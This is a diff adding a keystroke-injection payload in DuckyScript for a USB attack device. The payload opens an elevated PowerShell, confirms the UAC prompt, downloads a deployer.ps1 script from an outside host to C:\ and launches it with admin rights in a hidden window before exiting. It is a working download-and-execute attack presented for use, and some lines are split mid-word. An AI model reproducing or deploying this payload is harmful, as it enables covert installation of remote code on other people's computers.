@@ -1,0 +1,25 @@
+DELAY 1000
+REM Open PowerShell as Administrator
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb RunAs
+LEFTARROW
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+REM Download the executable using Invoke Web Req (Buck curl DOESNT
+WORK)
+STRING Start-Job -ScriptBlock {
+ENTER
+STRING Invoke-WebRequest http://vyapar.vaisworks.com:32773/
+deployer.ps1 -OutFile C:\deployer.ps1
+ENTER
+STRING Start-Process -FilePath "powershell.exe" -ArgumentList "-File",
+"C:\deployer.ps1" -Verb RunAs -WindowStyle Hidden
+ENTER
+STRING } | Out-Null
+ENTER
+DELAY 10000
+STRING exit
+ENTER
